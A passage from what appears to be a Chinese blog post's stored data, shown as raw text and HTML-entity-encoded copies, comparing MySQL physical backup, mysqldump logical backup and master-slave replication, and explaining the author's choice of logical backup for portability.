双机热备份\n\nmysql数据库没有增量备份的机制。当数据量太大的时候备份是一个很大的问题。还好mysql数据库提供了一种主从备份的机制(也就是双机热备)\n优点：适合数据量大的时候。现在明白了。大的互联网公司对于mysql数据备份，都是采用热机备份。搭建多台数据库服务器，进行主从复制。\n\n主从复制经常遇到的问题就是，如何保证数据不堵塞，不延迟。这个问题还是可以容忍的，有一些方案可以改善。毕竟有得有失的。这已经是很省心省力的方式了。\n\n\n================================================\n\n我目前应该使用什么样的备份策略的权衡：\n\n物理备份，恢复快，当然最好是存储在一个机器上。我现在是用物理备份还是逻辑备份为好呢？\n考虑到以后会迁移平台。为了保证通用性。恢复速度1分钟左右的差距我是可以容忍的(sql文件备份方式，恢复速度没有物理配备快，物理备份直接拷贝覆盖掉原来文件即可)。所以我为了跨平台，我更加愿意使用逻辑备份。存储sql文件形式。\n\n双热机备份方式，目前硬件没有多个。技术人员有限，需要人力去维护，比较麻烦。所以排除在外。","slug":"MySQL备份策略","published":0,"updated":"2016-11-18T06:50:52.216Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulf5005egwtmuy235knh","content":"<h3 id=\"&#x5E38;&#x89C1;&#x5907;&#x4EFD;&#x7B56;&#x7565;\"><a href=\"#&#x5E38;&#x89C1;&#x5907;&#x4EFD;&#x7B56;&#x7565;\" class=\"headerlink\" title=\"&#x5E38;&#x89C1;&#x5907;&#x4EFD;&#x7B56;&#x7565;\"></a>&#x5E38;&#x89C1;&#x5907;&#x4EFD;&#x7B56;&#x7565;</h3><p><strong>&#x7269;&#x7406;&#x5907;&#x4EFD;</strong>&#xFF1A;&#x76F4;&#x63A5;&#x62F7;&#x8D1D;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;<br><strong>&#x903B;&#x8F91;&#x5907;&#x4EFD;</strong>&#xFF1A;&#x4F7F;&#x7528; mysqlhotcopy / mysqldump &#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;<br><strong>&#x53CC;&#x673A;&#x70ED;&#x5907;</strong>&#xFF1A;&#x4F7F;&#x7528;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x673A;&#x5236;(&#x5B9E;&#x73B0;&#x6570;&#x636E;&#x5E93;&#x5B9E;&#x65F6;&#x5907;&#x4EFD;&#xFF09;</p>\n<h3 id=\"&#x7269;&#x7406;&#x5907;&#x4EFD;\"><a href=\"#&#x7269;&#x7406;&#x5907;&#x4EFD;\" class=\"headerlink\" title=\"&#x7269;&#x7406;&#x5907;&#x4EFD;\"></a>&#x7269;&#x7406;&#x5907;&#x4EFD;</h3><p>&#x76F4;&#x63A5;&#x62F7;&#x8D1D;&#x53EA;&#x9002;&#x7528;&#x4E8E;myisam&#x7C7B;&#x578B;&#x7684;&#x8868;&#x3002;&#x8FD9;&#x79CD;&#x7C7B;&#x578B;&#x7684;&#x8868;&#x662F;&#x4E0E;&#x673A;&#x5668;&#x72EC;&#x7ACB;&#x7684;&#x3002;&#x4F46;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#x662F;&#xFF0C;&#x4F60;&#x8BBE;&#x8BA1;&#x6570;&#x636E;&#x5E93;&#x7684;&#x65F6;&#x5019;&#x4E0D;&#x53EF;&#x80FD;&#x5168;&#x90E8;&#x4F7F;&#x7528;myisam&#x7C7B;&#x578B;&#x8868;&#x3002;&#x4F60;&#x4E5F;&#x4E0D;&#x53EF;&#x80FD;&#xFF1A;&#x56E0;&#x4E3A;myisam&#x7C7B;&#x578B;&#x8868;&#x4E0E;&#x673A;&#x5668;&#x72EC;&#x7ACB;&#xFF0C;&#x65B9;&#x4FBF;&#x79FB;&#x690D;&#xFF0C;&#x4E8E;&#x662F;&#x5C31;&#x9009;&#x62E9;&#x8FD9;&#x79CD;&#x8868;&#xFF0C;&#x8FD9;&#x5E76;&#x4E0D;&#x662F;&#x9009;&#x62E9;&#x5B83;&#x7684;&#x7406;&#x7531;&#x3002;</p>\n<p>&#x7F3A;&#x70B9;&#xFF1A;&#x4F60;&#x4E0D;&#x80FD;&#x53BB;&#x64CD;&#x4F5C;&#x6B63;&#x5728;&#x8FD0;&#x884C;&#x7684;mysql&#x670D;&#x52A1;&#x5668;(&#x5728;&#x62F7;&#x8D1D;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x6709;&#x7528;&#x6237;&#x901A;&#x8FC7;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x8BBF;&#x95EE;&#x66F4;&#x65B0;&#x6570;&#x636E;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x65E0;&#x6CD5;&#x5907;&#x4EFD;&#x5F53;&#x65F6;&#x7684;&#x6570;&#x636E;)&#x53EF;&#x80FD;&#x65E0;&#x6CD5;&#x79FB;&#x690D;&#x5230;&#x5176;&#x4ED6;&#x673A;&#x5668;&#x4E0A;&#x53BB;&#x3002;</p>\n<p>&#x66F4;&#x591A;&#x7684;&#x60C5;&#x51B5;&#x662F;&#xFF0C;&#x4F60;&#x4F1A;&#x6839;&#x636E;&#x4E1A;&#x52A1;&#x7279;&#x70B9;(&#x6BD4;&#x5982;&#x4F60;&#x9700;&#x8981;&#x652F;&#x6301;&#x4E8B;&#x52A1;&#x673A;&#x5236;&#x5C31;&#x5FC5;&#x987B;&#x4F7F;&#x7528;innodb)&#xFF0C;&#x67E5;&#x8BE2;&#x901F;&#x5EA6;&#x548C;&#x670D;&#x52A1;&#x6027;&#x80FD;&#x6765;&#x9009;&#x62E9;&#x8868;&#x7C7B;&#x578B;&#x7684;&#x3002;</p>\n<p><strong>&#x5FC5;&#x987B;&#x4FDD;&#x8BC1;&#x8868;&#x4E0D;&#x88AB;&#x4F7F;&#x7528;&#x4E2D;&#x3002;</strong><br>&#x5982;&#x679C;&#x670D;&#x52A1;&#x5668;&#x5728;&#x4F60;&#x6B63;&#x5728;&#x62F7;&#x8D1D;&#x4E00;&#x4E2A;&#x8868;&#x65F6;(&#x67D0;&#x4E2A;&#x7528;&#x6237;&#x5728;&#x8FDB;&#x884C;update&#x3001;insert&#x64CD;&#x4F5C;)&#x6539;&#x53D8;&#x5B83;&#xFF0C;&#x62F7;&#x8D1D;&#x7684;&#x6570;&#x636E;&#x5C31;&#x5931;&#x53BB;&#x4E86;&#x5907;&#x4EFD;&#x7684;&#x610F;&#x4E49;(&#x6CA1;&#x6CD5;&#x51C6;&#x786E;&#x8FD8;&#x539F;&#x5230;&#x5F53;&#x65F6;&#x7684;&#x70B9;)&#x3002;</p>\n<p>&#x5982;&#x679C;&#x6570;&#x636E;&#x5E93;&#x8868;&#x5728;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x5907;&#x4EFD;&#x8FC7;&#x7A0B;&#x4E2D;&#x88AB;&#x4FEE;&#x6539;&#xFF0C;&#x8FDB;&#x5165;&#x5907;&#x4EFD;&#x7684;&#x8868;&#x6587;&#x4EF6;&#x4E3B;&#x8BED;&#x4E0D;&#x4E00;&#x81F4;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x800C;&#x5BF9;&#x4EE5;&#x540E;&#x7684;&#x6062;&#x590D;&#x8868;&#x5C06;&#x5931;&#x53BB;&#x610F;&#x4E49;&#x3002;</p>\n<p>&#x4FDD;&#x8BC1;&#x4F60;&#x7684;&#x62F7;&#x8D1D;&#x5B8C;&#x6574;&#x6027;&#x7684;&#x6700;&#x597D;&#x65B9;&#x6CD5;&#x662F;&#xFF1A;&#x5173;&#x95ED;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x62F7;&#x8D1D;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x91CD;&#x542F;&#x670D;&#x52A1;&#x5668;&#x3002;<br>&#x6216;&#x8005;&#x662F;&#xFF0C;&#x8981;&#x9501;&#x5B9A;&#x5BF9;&#x5E94;&#x7684;&#x8868;(&#x5BF9;&#x524D;&#x7AEF;&#x7528;&#x6237;&#x9020;&#x6210;&#x8BBF;&#x95EE;&#x95EE;&#x9898;)&#x3002;</p>\n<p><strong>&#x89E3;&#x91CA;&#x76F4;&#x63A5;&#x62F7;&#x8D1D;&#x6587;&#x4EF6;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0D;&#x5177;&#x5907;&#x53EF;&#x79FB;&#x690D;&#x6027;&#xFF1F;</strong></p>\n<p>mysqldump &#x4EA7;&#x751F;&#x53EF;&#x79FB;&#x690D;&#x5230;&#x5176;&#x4ED6;&#x673A;&#x5668;&#x3001;&#x751A;&#x81F3;&#x5177;&#x6709;&#x4E0D;&#x540C;&#x786C;&#x4EF6;&#x7ED3;&#x6784;&#x7684;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x6587;&#x672C;&#x6587;&#x4EF6;&#x3002;&#x76F4;&#x63A5;&#x62F7;&#x8D1D;&#x6587;&#x4EF6;&#x4E0D;&#x80FD;&#x591F;&#x79FB;&#x690D;&#x5230;&#x5176;&#x4ED6;&#x673A;&#x5668;&#x4E0A;&#xFF0C;&#x9664;&#x975E;&#x8981;&#x62F7;&#x8D1D;&#x7684;&#x8868;&#x4F7F;&#x7528;MyISAM &#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x3002;ISAM &#x8868;&#x53EA;&#x80FD;&#x5728;&#x5177;&#x6709;&#x76F8;&#x540C;&#x786C;&#x4EF6;&#x7ED3;&#x6784;&#x7684;&#x673A;&#x5668;&#x4E4B;&#x95F4;&#x8FDB;&#x884C;&#x62F7;&#x8D1D;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x5C06;&#x6587;&#x4EF6;&#x4ECE;S PARC &#x7684;Solaris &#x673A;&#x5668;&#x62F7;&#x8D1D;&#x5230;Intel &#x7684;Solaris &#x673A;&#x5668;&#xFF08;&#x6216;&#x8005;&#x76F8;&#x53CD;&#xFF09;&#x662F;&#x884C;&#x4E0D;&#x901A;&#x7684;&#x3002;&#x7531;MySQL3.23 &#x5F15;&#x8FDB;&#x7684;MyISAM &#x8868;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x53EF;&#x4EE5;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x56E0;&#x4E3A;&#x8BE5;&#x683C;&#x5F0F;&#x4E0E;&#x673A;&#x5668;&#x72EC;&#x7ACB;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x5982;&#x679C;&#x4EE5;&#x4E0B;&#x4E24;&#x4E2A;&#x6761;&#x4EF6;&#x90FD;&#x6EE1;&#x8DB3;&#x7684;&#x8BDD;&#xFF0C;&#x76F4;&#x63A5;&#x62F7;&#x8D1D;&#x6587;&#x4EF6;&#x53EF;&#x4EE5;&#x79FB;&#x690D;&#x5230;&#x5177;&#x6709;&#x4E0D;&#x540C;&#x786C;&#x4EF6;&#x7ED3;&#x6784;&#x7684;&#x673A;&#x5668;&#x4E0A;&#xFF1A;&#x5373;&#x53E6;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x4E0A;&#x4E5F;&#x5FC5;&#x987B;&#x8FD0;&#x884C;MySQL3.23 &#x4EE5;&#x4E0A;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x5E76;&#x4E14;&#x6587;&#x4EF6;&#x5FC5;&#x987B;&#x8868;&#x793A;&#x6210;MyISAM &#x8868;&#xFF0C;&#x800C;&#x4E0D;&#x662F;ISAM &#x8868;&#x3002;</p>\n<h3 id=\"&#x903B;&#x8F91;&#x5907;&#x4EFD;\"><a href=\"#&#x903B;&#x8F91;&#x5907;&#x4EFD;\" class=\"headerlink\" title=\"&#x903B;&#x8F91;&#x5907;&#x4EFD;\"></a>&#x903B;&#x8F91;&#x5907;&#x4EFD;</h3><p>&#x4F7F;&#x7528;mysql&#x81EA;&#x5E26;&#x7684;mysqldump&#x5DE5;&#x5177;&#x8FDB;&#x884C;&#x5907;&#x4EFD;&#x3002;&#x5907;&#x4EFD;&#x6210;sql&#x6587;&#x4EF6;&#x5F62;&#x5F0F;&#x3002;<br>&#x4F18;&#x70B9;&#xFF1A;&#x6700;&#x5927;&#x597D;&#x5904;&#x662F;&#x80FD;&#x591F;&#x4E0E;&#x6B63;&#x5728;&#x8FD0;&#x884C;&#x7684;mysql&#x81EA;&#x52A8;&#x534F;&#x540C;&#x5DE5;&#x4F5C;&#xFF0C;<br>&#x5728;&#x8FD0;&#x884C;&#x671F;&#x95F4;&#x53EF;&#x4EE5;&#x786E;&#x4FDD;&#x5907;&#x4EFD;&#x662F;&#x5F53;&#x65F6;&#x7684;&#x70B9;&#xFF0C;&#x5B83;&#x4F1A;&#x81EA;&#x52A8;&#x5C06;&#x5BF9;&#x5E94;&#x64CD;&#x4F5C;&#x7684;&#x8868;&#x9501;&#x5B9A;&#xFF0C;&#x4E0D;&#x5141;&#x8BB8;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x4FEE;&#x6539;(&#x53EA;&#x80FD;&#x8BBF;&#x95EE;)&#x3002;&#x53EF;&#x80FD;&#x4F1A;&#x963B;&#x6B62;&#x4FEE;&#x6539;&#x64CD;&#x4F5C;&#x3002;sql&#x6587;&#x4EF6;&#x901A;&#x7528;&#x65B9;&#x4FBF;&#x79FB;&#x690D;&#x3002;</p>\n<p>&#x7F3A;&#x70B9;&#xFF1A;&#x5907;&#x4EFD;&#x7684;&#x901F;&#x5EA6;&#x6BD4;&#x8F83;&#x6162;&#x3002;&#x5982;&#x679C;&#x662F;&#x6570;&#x636E;&#x91CF;&#x5F88;&#x591A;&#x7684;&#x65F6;&#x5019;&#x3002;&#x5C31;&#x5F88;&#x8017;&#x65F6;&#x95F4;&#x3002;&#x5982;&#x679C;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x5904;&#x5728;&#x63D0;&#x4F9B;&#x7ED9;&#x7528;&#x6237;&#x670D;&#x52A1;&#x72B6;&#x6001;&#xFF0C;&#x5728;&#x8FD9;&#x6BB5;&#x957F;&#x65F6;&#x95F4;&#x64CD;&#x4F5C;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x610F;&#x5473;&#x7740;&#x8981;&#x9501;&#x5B9A;&#x8868;(&#x4E00;&#x822C;&#x662F;&#x8BFB;&#x9501;&#x5B9A;&#xFF0C;&#x53EA;&#x80FD;&#x8BFB;&#x4E0D;&#x80FD;&#x5199;&#x5165;&#x6570;&#x636E;)&#x3002;&#x90A3;&#x4E48;&#x670D;&#x52A1;&#x5C31;&#x4F1A;&#x5F71;&#x54CD;&#x7684;&#x3002;</p>\n<p>&#x5907;&#x6CE8;&#xFF1A;&#x6240;&#x8C13;&#x7684;&#x4E0E;mysql&#x670D;&#x52A1;&#x5668;&#x80FD;&#x591F;&#x81EA;&#x52A8;&#x534F;&#x540C;&#x5DE5;&#x4F5C;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x6307;&#x52A0;&#x53C2;&#x6570;&#x6765;&#x63A7;&#x5236;mysql&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x6BD4;&#x5982;&#x9501;&#x5B9A;&#x6240;&#x6709;&#x8868;&#x53EA;&#x80FD;&#x8FDB;&#x884C;&#x8BFB;&#xFF0C;&#x4E0D;&#x80FD;&#x8FDB;&#x884C;&#x5199;&#x64CD;&#x4F5C;&#x3002;</p>\n<p>&#x2013;lock-all-tables</p>\n<h3 id=\"&#x53CC;&#x673A;&#x70ED;&#x5907;&#x4EFD;\"><a href=\"#&#x53CC;&#x673A;&#x70ED;&#x5907;&#x4EFD;\" class=\"headerlink\" title=\"&#x53CC;&#x673A;&#x70ED;&#x5907;&#x4EFD;\"></a>&#x53CC;&#x673A;&#x70ED;&#x5907;&#x4EFD;</h3><p>mysql&#x6570;&#x636E;&#x5E93;&#x6CA1;&#x6709;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x7684;&#x673A;&#x5236;&#x3002;&#x5F53;&#x6570;&#x636E;&#x91CF;&#x592A;&#x5927;&#x7684;&#x65F6;&#x5019;&#x5907;&#x4EFD;&#x662F;&#x4E00;&#x4E2A;&#x5F88;&#x5927;&#x7684;&#x95EE;&#x9898;&#x3002;&#x8FD8;&#x597D;mysql&#x6570;&#x636E;&#x5E93;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x79CD;&#x4E3B;&#x4ECE;&#x5907;&#x4EFD;&#x7684;&#x673A;&#x5236;(&#x4E5F;&#x5C31;&#x662F;&#x53CC;&#x673A;&#x70ED;&#x5907;)<br>&#x4F18;&#x70B9;&#xFF1A;&#x9002;&#x5408;&#x6570;&#x636E;&#x91CF;&#x5927;&#x7684;&#x65F6;&#x5019;&#x3002;&#x73B0;&#x5728;&#x660E;&#x767D;&#x4E86;&#x3002;&#x5927;&#x7684;&#x4E92;&#x8054;&#x7F51;&#x516C;&#x53F8;&#x5BF9;&#x4E8E;mysql&#x6570;&#x636E;&#x5907;&#x4EFD;&#xFF0C;&#x90FD;&#x662F;&#x91C7;&#x7528;&#x70ED;&#x673A;&#x5907;&#x4EFD;&#x3002;&#x642D;&#x5EFA;&#x591A;&#x53F0;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x8FDB;&#x884C;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x3002;</p>\n<p>&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x7ECF;&#x5E38;&#x9047;&#x5230;&#x7684;&#x95EE;&#x9898;&#x5C31;&#x662F;&#xFF0C;&#x5982;&#x4F55;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x4E0D;&#x5835;&#x585E;&#xFF0C;&#x4E0D;&#x5EF6;&#x8FDF;&#x3002;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x8FD8;&#x662F;&#x53EF;&#x4EE5;&#x5BB9;&#x5FCD;&#x7684;&#xFF0C;&#x6709;&#x4E00;&#x4E9B;&#x65B9;&#x6848;&#x53EF;&#x4EE5;&#x6539;&#x5584;&#x3002;&#x6BD5;&#x7ADF;&#x6709;&#x5F97;&#x6709;&#x5931;&#x7684;&#x3002;&#x8FD9;&#x5DF2;&#x7ECF;&#x662F;&#x5F88;&#x7701;&#x5FC3;&#x7701;&#x529B;&#x7684;&#x65B9;&#x5F0F;&#x4E86;&#x3002;</p>\n<p>================================================</p>\n<p>&#x6211;&#x76EE;&#x524D;&#x5E94;&#x8BE5;&#x4F7F;&#x7528;&#x4EC0;&#x4E48;&#x6837;&#x7684;&#x5907;&#x4EFD;&#x7B56;&#x7565;&#x7684;&#x6743;&#x8861;&#xFF1A;</p>\n<p>&#x7269;&#x7406;&#x5907;&#x4EFD;&#xFF0C;&#x6062;&#x590D;&#x5FEB;&#xFF0C;&#x5F53;&#x7136;&#x6700;&#x597D;&#x662F;&#x5B58;&#x50A8;&#x5728;&#x4E00;&#x4E2A;&#x673A;&#x5668;&#x4E0A;&#x3002;&#x6211;&#x73B0;&#x5728;&#x662F;&#x7528;&#x7269;&#x7406;&#x5907;&#x4EFD;&#x8FD8;&#x662F;&#x903B;&#x8F91;&#x5907;&#x4EFD;&#x4E3A;&#x597D;&#x5462;&#xFF1F;<br>&#x8003;&#x8651;&#x5230;&#x4EE5;&#x540E;&#x4F1A;&#x8FC1;&#x79FB;&#x5E73;&#x53F0;&#x3002;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x901A;&#x7528;&#x6027;&#x3002;&#x6062;&#x590D;&#x901F;&#x5EA6;1&#x5206;&#x949F;&#x5DE6;&#x53F3;&#x7684;&#x5DEE;&#x8DDD;&#x6211;&#x662F;&#x53EF;&#x4EE5;&#x5BB9;&#x5FCD;&#x7684;(sql&#x6587;&#x4EF6;&#x5907;&#x4EFD;&#x65B9;&#x5F0F;&#xFF0C;&#x6062;&#x590D;&#x901F;&#x5EA6;&#x6CA1;&#x6709;&#x7269;&#x7406;&#x914D;&#x5907;&#x5FEB;&#xFF0C;&#x7269;&#x7406;&#x5907;&#x4EFD;&#x76F4;&#x63A5;&#x62F7;&#x8D1D;&#x8986;&#x76D6;&#x6389;&#x539F;&#x6765;&#x6587;&#x4EF6;&#x5373;&#x53EF;)&#x3002;&#x6240;&#x4EE5;&#x6211;&#x4E3A;&#x4E86;&#x8DE8;&#x5E73;&#x53F0;&#xFF0C;&#x6211;&#x66F4;&#x52A0;&#x613F;&#x610F;&#x4F7F;&#x7528;&#x903B;&#x8F91;&#x5907;&#x4EFD;&#x3002;&#x5B58;&#x50A8;sql&#x6587;&#x4EF6;&#x5F62;&#x5F0F;&#x3002;</p>\n<p>&#x53CC;&#x70ED;&#x673A;&#x5907;&#x4EFD;&#x65B9;&#x5F0F;&#xFF0C;&#x76EE;&#x524D;&#x786C;&#x4EF6;&#x6CA1;&#x6709;&#x591A;&#x4E2A;&#x3002;&#x6280;&#x672F;&#x4EBA;&#x5458;&#x6709;&#x9650;&#xFF0C;&#x9700;&#x8981;&#x4EBA;&#x529B;&#x53BB;&#x7EF4;&#x62A4;&#xFF0C;&#x6BD4;&#x8F83;&#x9EBB;&#x70E6;&#x3002;&#x6240;&#x4EE5;&#x6392;&#x9664;&#x5728;&#x5916;&#x3002;</p>\n","excerpt":"","more":"<h3 id=\"&#x5E38;&#x89C1;&#x5907;&#x4EFD;&#x7B56;&#x7565;\"><a href=\"#&#x5E38;&#x89C1;&#x5907;&#x4EFD;&#x7B56;&#x7565;\" class=\"headerlink\" title=\"&#x5E38;&#x89C1;&#x5907;&#x4EFD;&#x7B56;&#x7565;\"></a>&#x5E38;&#x89C1;&#x5907;&#x4EFD;&#x7B56;&#x7565;</h3><p><strong>&#x7269;&#x7406;&#x5907;&#x4EFD;</strong>&#xFF1A;&#x76F4;&#x63A5;&#x62F7;&#x8D1D;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;<br><strong>&#x903B;&#x8F91;&#x5907;&#x4EFD;</strong>&#xFF1A;&#x4F7F;&#x7528; mysqlhotcopy / mysqldump &#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;<br><strong>&#x53CC;&#x673A;&#x70ED;&#x5907;</strong>&#xFF1A;&#x4F7F;&#x7528;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x673A;&#x5236;(&#x5B9E;&#x73B0;&#x6570;&#x636E;&#x5E93;&#x5B9E;&#x65F6;&#x5907;&#x4EFD;&#xFF09;</p>\n<h3 id=\"&#x7269;&#x7406;&#x5907;&#x4EFD;\"><a href=\"#&#x7269;&#x7406;&#x5907;&#x4EFD;\" class=\"headerlink\" title=\"&#x7269;&#x7406;&#x5907;&#x4EFD;\"></a>&#x7269;&#x7406;&#x5907;&#x4EFD;</h3><p>&#x76F4;&#x63A5;&#x62F7;&#x8D1D;&#x53EA;&#x9002;&#x7528;&#x4E8E;myisam&#x7C7B;&#x578B;&#x7684;&#x8868;&#x3002;&#x8FD9;&#x79CD;&#x7C7B;&#x578B;&#x7684;&#x8868;&#x662F;&#x4E0E;&#x673A;&#x5668;&#x72EC;&#x7ACB;&#x7684;&#x3002;&#x4F46;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#x662F;&#xFF0C;&#x4F60;&#x8BBE;&#x8BA1;&#x6570;&#x636E;&#x5E93;&#x7684;&#x65F6;&#x5019;&#x4E0D;&#x53EF;&#x80FD;&#x5168;&#x90E8;&#x4F7F;&#x7528;myisam&#x7C7B;&#x578B;&#x8868;&#x3002;&#x4F60;&#x4E5F;&#x4E0D;&#x53EF;&#x80FD;&#xFF1A;&#x56E0;&#x4E3A;myisam&#x7C7B;&#x578B;&#x8868;&#x4E0E;&#x673A;&#x5668;&#x72EC;&#x7ACB;&#xFF0C;&#x65B9;&#x4FBF;&#x79FB;&#x690D;&#xFF0C;&#x4E8E;&#x662F;&#x5C31;&#x9009;&#x62E9;&#x8FD9;&#x79CD;&#x8868;&#xFF0C;&#x8FD9;&#x5E76;&#x4E0D;&#x662F;&#x9009;&#x62E9;&#x5B83;&#x7684;&#x7406;&#x7531;&#x3002;</p>\n<p>&#x7F3A;&#x70B9;&#xFF1A;&#x4F60;&#x4E0D;&#x80FD;&#x53BB;&#x64CD;&#x4F5C;&#x6B63;&#x5728;&#x8FD0;&#x884C;&#x7684;mysql&#x670D;&#x52A1;&#x5668;(&#x5728;&#x62F7;&#x8D1D;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x6709;&#x7528;&#x6237;&#x901A;&#x8FC7;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x8BBF;&#x95EE;&#x66F4;&#x65B0;&#x6570;&#x636E;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x65E0;&#x6CD5;&#x5907;&#x4EFD;&#x5F53;&#x65F6;&#x7684;&#x6570;&#x636E;)&#x53EF;&#x80FD;&#x65E0;&#x6CD5;&#x79FB;&#x690D;&#x5230;&#x5176;&#x4ED6;&#x673A;&#x5668;&#x4E0A;&#x53BB;&#x3002;</p>\n<p>&#x66F4;&#x591A;&#x7684;&#x60C5;&#x51B5;&#x662F;&#xFF0C;&#x4F60;&#x4F1A;&#x6839;&#x636E;&#x4E1A;&#x52A1;&#x7279;&#x70B9;(&#x6BD4;&#x5982;&#x4F60;&#x9700;&#x8981;&#x652F;&#x6301;&#x4E8B;&#x52A1;&#x673A;&#x5236;&#x5C31;&#x5FC5;&#x987B;&#x4F7F;&#x7528;innodb)&#xFF0C;&#x67E5;&#x8BE2;&#x901F;&#x5EA6;&#x548C;&#x670D;&#x52A1;&#x6027;&#x80FD;&#x6765;&#x9009;&#x62E9;&#x8868;&#x7C7B;&#x578B;&#x7684;&#x3002;</p>\n<p><strong>&#x5FC5;&#x987B;&#x4FDD;&#x8BC1;&#x8868;&#x4E0D;&#x88AB;&#x4F7F;&#x7528;&#x4E2D;&#x3002;</strong><br>&#x5982;&#x679C;&#x670D;&#x52A1;&#x5668;&#x5728;&#x4F60;&#x6B63;&#x5728;&#x62F7;&#x8D1D;&#x4E00;&#x4E2A;&#x8868;&#x65F6;(&#x67D0;&#x4E2A;&#x7528;&#x6237;&#x5728;&#x8FDB;&#x884C;update&#x3001;insert&#x64CD;&#x4F5C;)&#x6539;&#x53D8;&#x5B83;&#xFF0C;&#x62F7;&#x8D1D;&#x7684;&#x6570;&#x636E;&#x5C31;&#x5931;&#x53BB;&#x4E86;&#x5907;&#x4EFD;&#x7684;&#x610F;&#x4E49;(&#x6CA1;&#x6CD5;&#x51C6;&#x786E;&#x8FD8;&#x539F;&#x5230;&#x5F53;&#x65F6;&#x7684;&#x70B9;)&#x3002;</p>\n<p>&#x5982;&#x679C;&#x6570;&#x636E;&#x5E93;&#x8868;&#x5728;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x5907;&#x4EFD;&#x8FC7;&#x7A0B;&#x4E2D;&#x88AB;&#x4FEE;&#x6539;&#xFF0C;&#x8FDB;&#x5165;&#x5907;&#x4EFD;&#x7684;&#x8868;&#x6587;&#x4EF6;&#x4E3B;&#x8BED;&#x4E0D;&#x4E00;&#x81F4;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x800C;&#x5BF9;&#x4EE5;&#x540E;&#x7684;&#x6062;&#x590D;&#x8868;&#x5C06;&#x5931;&#x53BB;&#x610F;&#x4E49;&#x3002;</p>\n<p>&#x4FDD;&#x8BC1;&#x4F60;&#x7684;&#x62F7;&#x8D1D;&#x5B8C;&#x6574;&#x6027;&#x7684;&#x6700;&#x597D;&#x65B9;&#x6CD5;&#x662F;&#xFF1A;&#x5173;&#x95ED;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x62F7;&#x8D1D;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x91CD;&#x542F;&#x670D;&#x52A1;&#x5668;&#x3002;<br>&#x6216;&#x8005;&#x662F;&#xFF0C;&#x8981;&#x9501;&#x5B9A;&#x5BF9;&#x5E94;&#x7684;&#x8868;(&#x5BF9;&#x524D;&#x7AEF;&#x7528;&#x6237;&#x9020;&#x6210;&#x8BBF;&#x95EE;&#x95EE;&#x9898;)&#x3002;</p>\n<p><strong>&#x89E3;&#x91CA;&#x76F4;&#x63A5;&#x62F7;&#x8D1D;&#x6587;&#x4EF6;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0D;&#x5177;&#x5907;&#x53EF;&#x79FB;&#x690D;&#x6027;&#xFF1F;</strong></p>\n<p>mysqldump &#x4EA7;&#x751F;&#x53EF;&#x79FB;&#x690D;&#x5230;&#x5176;&#x4ED6;&#x673A;&#x5668;&#x3001;&#x751A;&#x81F3;&#x5177;&#x6709;&#x4E0D;&#x540C;&#x786C;&#x4EF6;&#x7ED3;&#x6784;&#x7684;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x6587;&#x672C;&#x6587;&#x4EF6;&#x3002;&#x76F4;&#x63A5;&#x62F7;&#x8D1D;&#x6587;&#x4EF6;&#x4E0D;&#x80FD;&#x591F;&#x79FB;&#x690D;&#x5230;&#x5176;&#x4ED6;&#x673A;&#x5668;&#x4E0A;&#xFF0C;&#x9664;&#x975E;&#x8981;&#x62F7;&#x8D1D;&#x7684;&#x8868;&#x4F7F;&#x7528;MyISAM &#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x3002;ISAM &#x8868;&#x53EA;&#x80FD;&#x5728;&#x5177;&#x6709;&#x76F8;&#x540C;&#x786C;&#x4EF6;&#x7ED3;&#x6784;&#x7684;&#x673A;&#x5668;&#x4E4B;&#x95F4;&#x8FDB;&#x884C;&#x62F7;&#x8D1D;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x5C06;&#x6587;&#x4EF6;&#x4ECE;S PARC &#x7684;Solaris &#x673A;&#x5668;&#x62F7;&#x8D1D;&#x5230;Intel &#x7684;Solaris 